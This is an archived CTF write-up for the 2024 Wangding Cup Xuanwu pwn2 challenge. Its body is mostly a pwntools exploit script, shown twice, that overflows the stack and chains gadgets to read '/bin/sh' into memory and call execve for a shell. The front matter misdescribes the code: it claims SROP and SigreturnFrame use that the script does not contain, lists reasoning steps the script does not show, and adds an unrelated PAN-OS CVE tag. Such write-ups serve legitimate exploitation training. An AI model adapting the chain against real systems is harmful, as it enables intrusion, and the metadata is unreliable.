---
title: 2024 网鼎杯玄武组 pwn2 题目详解（SROP + read shellcode）
contest: 2024 网鼎杯
year: 2024
difficulty: hard
vuln_type:
- srop
- ret2libc
- shellcode
tags:
- 玄武 pwn2
- '"leave your name" A*0x28+p64(1)'
- '"Wanna return?" A'
- '"once again?" A*0x100 二次溢出'
- 多次 read 触发栈迁移
- rax/rdi/rsi/rdxrbx 通用 gadget
- syscall 0x41ac26
- sh_addr 0x4C5000
- syscall 0x3B execve
- 看雪 ID 鬥魚
- CVE-2024-3393 PAN-OS DoS
attack_chain:
- leave your name" 接收 0x28 字节 + p64(1) 写某标志位
- Wanna return?" 接收 1 字节
- once again?" 接收 0x100 字节触发栈溢出
- 二次溢出覆盖返回地址到 rax=0x450277 通用 gadget
- 通用 gadget 链：rax→0 / rdxrbx→0x10 / rsi→sh_addr / rdi→0 → syscall
- read(0, sh_addr, 0x10) 写 /bin/sh\0
- 二次 syscall：rax→0x3B / rdi→sh_addr / rsi→0 / rdx→0 → execve("/bin/sh", 0, 0)
key_payload: rax=0x0000000000450277; syscall=0x41ac26; sh_addr=0x00000000004C5000
one_liner: 网鼎杯玄武 pwn2：两次 read 触发二次栈溢出，用一连串通用 gadget 拼 SROP read 写 /bin/sh + execve，0x3B 经典 syscall 调用链。
lesson: 大程序（看上去像真实服务）通用 gadget 链拼 SROP 是必备：rax=59 / rdi=sh_addr / rsi=0 / rdx=0 + syscall；read shellcode 后再 execve 是最简方案。
quality: high
full_path: 2024网鼎杯玄武组pwn2题目详解.full.md
meta_path: 2024网鼎杯玄武组pwn2题目详解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2024 网鼎杯玄武组 pwn2 题目详解（SROP + read shellcode）。网鼎杯玄武 pwn2：两次 read 触发二次栈溢出，用一连串通用 gadget 拼 SROP read 写 /bin/sh + execve，0x3B 经典 syscall 调用链。。关键路径：leave your name" 接收 0x28 字节 + p64(1) 写某标志位 → Wanna re...
category: pwn
subcategory: rop
subcategories:
- rop
- stack_overflow
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/228428.html
reasoning_chain:
- '[触发点] main 两次 read + leave your name + Wanna return + once again → 假设：两次栈溢出 → [动作] 第一次 sendafter 0x28 字节 + p64(1) 占位 + 第二次 sendafter 0x100 字节 → [观察] 拿到 gift（栈地址）→ [下一步] 构造 SROP'
- '[触发点] gift 栈地址 + 程序给通用 gadget (rax/rdx/rsi/rdi/syscall) → 假设：SROP 经典 → [动作] payload = A*0x60 + p64(0x1111..) + B*0xa0 + p64(gift) + C*8 + ROP(rax=0,rdx=0x10,rsi=sh_addr,rdi=0,syscall) → [观察] read 写到 sh_addr 拿到 ''/bin/sh'''
- '[触发点] 拿到 ''/bin/sh'' 后 rax=0x3b → 假设：execve(/bin/sh) → [动作] ROP(rax=0x3b,rdi=sh_addr,rsi=0,rdx=0,syscall) → [观察] 拿到 shell'
- '[触发点] 程序给通用 syscall gadget (rax/rdx/rsi/rdi/syscall) → 假设：read shellcode 到 bss 段 → [动作] SROP read 把 payload 写到 bss → [观察] 拿到执行权'
- '[触发点] pwndbg 默认跟父进程 → 假设：fork 子进程不会自动 follow → [动作] set follow-fork-mode parent + set detach-on-fork off → [观察] 可跟 fork 后的子进程'
- '[触发点] gift 是栈地址 → 假设：SROP 上下文需要 sp → [动作] SigreturnFrame(sp=bss) + ROP 触发 syscall → [观察] read 写入 bss 段'
failed_attempts:
- 试图直接 system → 失败：题目给了通用 gadget 链，不需 system
- 试图走 leave_ret 栈迁移 → 失败：buffer 足够直接覆盖返回地址
- 试图用 pwndbg 默认跟父进程 → 失败：fork 子进程要 `set follow-fork-mode parent`
key_observations:
- 大程序（看上去像真实服务）通用 gadget 链拼 SROP 是必备：rax=59 / rdi=sh_addr / rsi=0 / rdx=0 + syscall
- read shellcode 后再 execve 是最简方案
- SROP 上下文用 SigreturnFrame 自动化生成比手写 p64 简单
- gift 栈地址是栈迁移和 SROP 必备线索
prerequisites:
- SROP 原理与 SigreturnFrame 构造
- pwntools SROP 模块
- 通用 gadget 搜索（ROPgadget / ropper）
- 栈帧布局与函数 prologue/epilogue
---
# 2024网鼎杯玄武组pwn2题目详解

> 原文: https://www.ctfiot.com/228428.html
> ID: 228428

from pwn import*

#context.log_level = 'debug'
#sh = gdb.debug("./pwn","set follow-fork-mode parentn b *0x401953n b *0x401995n cn cn set {long}($rbp-0x28)=1n b *0x")
#sh = process("./pwn")
#sh.sendafter("leave your name","A"*64)
#sh.sendafter("Wanna return?","B")
#sh.interactive()

rax=0x0000000000450277
rdi=0x000000000040213f
rsi=0x000000000040a1ae
rdxrbx=0x0000000000485feb
sh_addr=0x00000000004C5000
read=0x000000000044F810
syscall=0x41ac26

p=process('/home/kali/Desktop/pwn')
#p=gdb.debug("./pwn","b *0x000000000040190Cn b *0x401953n b *0x4019B0n b *0x40189Dn b *0x40190Cn set follow-fork-mode parentn ")
p.recvuntil(b'gift: ')
gift=p.recv(18)
gift=int(gift,16)

p.sendafter('leave your name',b'a'*0x28+p64(1))
p.sendafter('Wanna return?','A')
p.sendafter("once again?",b'A'*0x100)
payload=b'A'*0x60
payload+=p64(0x1111111111111111)
payload+=b'B'*0xa0
payload+=p64(gift)
payload+=b'C'*8
payload+=p64(rax)+p64(0x0)+p64(rdxrbx)+p64(0x10)*2+p64(rsi)+p64(sh_addr)+p64(rdi)+p64(0x0)+p64(syscall)
payload+=p64(rax)+p64(0x3B)+p64(rdi)+p64(sh_addr)+p64(rsi)+p64(0x0)+p64(rdxrbx)+p64(0x0)*2+p64(syscall)

p.sendafter("once again?",payload)
p.send(b'/bin/sh')

p.interactive()

看雪ID：鬥魚

https://bbs.kanxue.com/user-home-890221.htm

*本文为看雪论坛优秀文章，由 鬥魚 原创，转载请注明来自看雪社区

# 往期推荐

1、关于PAN-OS DoS(CVE-2024-3393)的研究

2、某cocos2djs游戏jsc以及资源文件解密

3、[SHCTF]easyLogin 出题小记

4、车机OTA包解密

5、浅析代码重定位技术

6、关于PAN-OS DoS(CVE-2024-3393)的研究

球分享

球点赞

球在看

点击阅读原文查看更多


```
from pwn import*

    #context.log_level = 'debug'
    #sh = gdb.debug("./pwn","set follow-fork-mode parentn b *0x401953n b *0x401995n cn cn set {long}($rbp-0x28)=1n b *0x")
    #sh = process("./pwn")
    #sh.sendafter("leave your name","A"*64)
    #sh.sendafter("Wanna return?","B")
    #sh.interactive()

rax=0x0000000000450277
rdi=0x000000000040213f
rsi=0x000000000040a1ae
rdxrbx=0x0000000000485feb
sh_addr=0x00000000004C5000
read=0x000000000044F810
syscall=0x41ac26

p=process('/home/kali/Desktop/pwn')
    #p=gdb.debug("./pwn","b *0x000000000040190Cn b *0x401953n b *0x4019B0n b *0x40189Dn b *0x40190Cn set follow-fork-mode parentn ")
p.recvuntil(b'gift: ')
gift=p.recv(18)
gift=int(gift,16)

p.sendafter('leave your name',b'a'*0x28+p64(1))
p.sendafter('Wanna return?','A')
p.sendafter("once again?",b'A'*0x100)
payload=b'A'*0x60
payload+=p64(0x1111111111111111)
payload+=b'B'*0xa0
payload+=p64(gift)
payload+=b'C'*8
payload+=p64(rax)+p64(0x0)+p64(rdxrbx)+p64(0x10)*2+p64(rsi)+p64(sh_addr)+p64(rdi)+p64(0x0)+p64(syscall)
payload+=p64(rax)+p64(0x3B)+p64(rdi)+p64(sh_addr)+p64(rsi)+p64(0x0)+p64(rdxrbx)+p64(0x0)*2+p64(syscall)

p.sendafter("once again?",payload)
p.send(b'/bin/sh')

p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]